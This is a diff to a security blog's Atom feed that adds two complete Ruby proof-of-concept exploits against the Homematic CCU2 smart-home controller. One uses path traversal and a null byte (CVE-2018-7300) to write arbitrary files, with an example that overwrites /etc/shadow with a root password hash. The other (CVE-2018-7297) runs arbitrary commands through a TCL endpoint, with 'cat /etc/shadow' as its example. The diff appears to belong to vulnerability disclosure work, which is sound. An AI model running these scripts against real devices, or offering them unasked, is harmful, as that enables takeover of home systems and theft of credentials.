@@ -4,7 +4,7 @@
  <title>Patrick Münch Blog</title>
  <link href="http://atomic111.github.io/atom.xml" rel="self"/>
  <link href="http://atomic111.github.io/"/>
- <updated>2018-03-01T11:55:02+01:00</updated>
+ <updated>2018-03-29T01:24:46+02:00</updated>
  <id>http://atomic111.github.io</id>
  <author>
    <name>Patrick Münch</name>
@@ -93,6 +93,91 @@ exec echo $args(userLang)&amp;gt;/etc/config/userprofiles/$args(userName).lang
 &lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;This means that an attacker can create or overwrite arbitrary files on the CCU2’s filesystem. Please note that full control over the target file name can be obtained by injecting a null byte into the userName argument in order to prevent the string “.lang” from being appended to the resulting file name. The file contents can be directly controlled via the userLang argument.&lt;/p&gt;
+
+&lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof-of-Concept&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;#!/usr/bin/ruby
+
+# Exploit Title: Homematic CCU2 Arbitrary File Write
+# Date: 28-03-18
+# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
+# Vendor Homepage: http://www.eq-3.de
+# Software Link: http://www.eq-3.de/service/downloads.html?id=268
+# Version: 2.29.23
+# CVE : 2018-7300
+
+# Description: http://atomic111.github.io/article/homematic-ccu2-filewrite
+
+require &#39;net/http&#39;
+require &#39;net/https&#39;
+require &#39;uri&#39;
+require &#39;json&#39;
+
+unless ARGV.length == 3
+  STDOUT.puts &amp;lt;&amp;lt;-EOF
+Please provide url
+
+Usage:
+  write_files.rb &amp;lt;ip.adress&amp;gt; &amp;lt;file path&amp;gt; &amp;lt;content of the file&amp;gt;
+
+Example:
+  write_files.rb https://192.168.1.1 &#39;/etc/shadow&#39; &#39;root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::&#39;
+
+  or
+
+  write_files.rb http://192.168.1.1 &#39;/etc/shadow&#39; &#39;root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::&#39;
+
+EOF
+  exit
+end
+
+# The first argument specifies the URL and if http or https is used
+url = ARGV[0] + &quot;/api/homematic.cgi&quot;
+
+# The second argument specifies the file into which the content should be written
+homematic_file_path = ARGV[1]
+
+# The third argument specifies the content of the file
+homematic_file_content = ARGV[2]
+
+# define the json body for the attack
+body = {
+        &quot;version&quot;: &quot;1.1&quot;,
+        &quot;method&quot;: &quot;User.setLanguage&quot;,
+        &quot;params&quot;: {
+                    &quot;userName&quot;: &quot;file path&quot;,
+                    &quot;userLang&quot;: &quot;file content&quot;
+                  }
+        }.to_hash
+
+# define the traversal with the file you want to write
+body[:params][:userName] = &quot;../../../../../../../..&quot; + homematic_file_path + &quot;\u0000&quot;
+
+# define the content
+body[:params][:userLang] = homematic_file_content
+
+# split the uri to access it in a easier way
+uri = URI.parse(url)
+
+# define target connection, disabling certificate verification
+Net::HTTP.start(uri.host, uri.port, :use_ssl =&amp;gt; uri.scheme == &#39;https&#39;, :verify_mode =&amp;gt; OpenSSL::SSL::VERIFY_NONE) do |http|
+
+  # define post request
+  request = Net::HTTP::Post.new(uri.request_uri)
+
+  # define the content type of the http request
+  request.content_type = &#39;application/json&#39;
+
+  # define the request body
+  request.body = body.to_json
+
+  # send the request to the homematic ccu2
+  response = http.request(request)
+
+  # print response message code and status to cli
+  puts &#39;Response code: &#39; + response.code + &#39; &#39; + response.message
+end
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
 
@@ -200,6 +285,71 @@ string stderr;
 system.Exec(&quot;cat /etc/shadow&quot;, &amp;amp;stdout, &amp;amp;stderr);
 WriteLine(stdout);
 &lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof-of-Concept&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;#!/usr/bin/ruby
+
+# Exploit Title: Homematic CCU2 Remote Command Execution
+# Date: 28-03-18
+# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
+# Vendor Homepage: http://www.eq-3.de
+# Software Link: http://www.eq-3.de/service/downloads.html?id=268
+# Version: 2.29.23
+# CVE : 2018-7297
+
+# Description: http://atomic111.github.io/article/homematic-ccu2-remote-code-execution
+
+require &#39;net/http&#39;
+require &#39;net/https&#39;
+require &#39;uri&#39;
+
+unless ARGV.length == 2
+  STDOUT.puts &amp;lt;&amp;lt;-EOF
+Please provide url and the command, which is execute on the homematic
+
+Usage:
+  execute_cmd.rb &amp;lt;ip.adress&amp;gt; &amp;lt;homematic command&amp;gt;
+
+Example:
+  execute_cmd.rb https://192.168.1.1 &quot;cat /etc/shadow&quot;
+
+  or
+
+  execute_cmd.rb http://192.168.1.1 &quot;cat /etc/shadow&quot;
+
+EOF
+  exit
+end
+
+# The first argument specifies the URL and if http or https is used
+url = ARGV[0] + &quot;/Test.exe&quot;
+
+# The second argument specifies the command which is executed via tcl interpreter
+tcl_command = ARGV[1]
+
+# define body content
+body = &quot;string stdout;string stderr;system.Exec(\&quot;&quot; &amp;lt;&amp;lt; tcl_command &amp;lt;&amp;lt; &quot;\&quot;, &amp;amp;stdout, &amp;amp;stderr);WriteLine(stdout);&quot;
+
+# split uri to access it in a easier way
+uri = URI.parse(url)
+
+# define target connection, disabling certificate verification
+Net::HTTP.start(uri.host, uri.port, :use_ssl =&amp;gt; uri.scheme == &#39;https&#39;, :verify_mode =&amp;gt; OpenSSL::SSL::VERIFY_NONE) do |http|
+
+  # define post request
+  request = Net::HTTP::Post.new(uri.request_uri)
+
+  # define the request body
+  request.body = body
+
+  # send the request to the homematic ccu2
+  response = http.request(request)
+
+  # print response to cli
+  puts response.body
+end
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
 
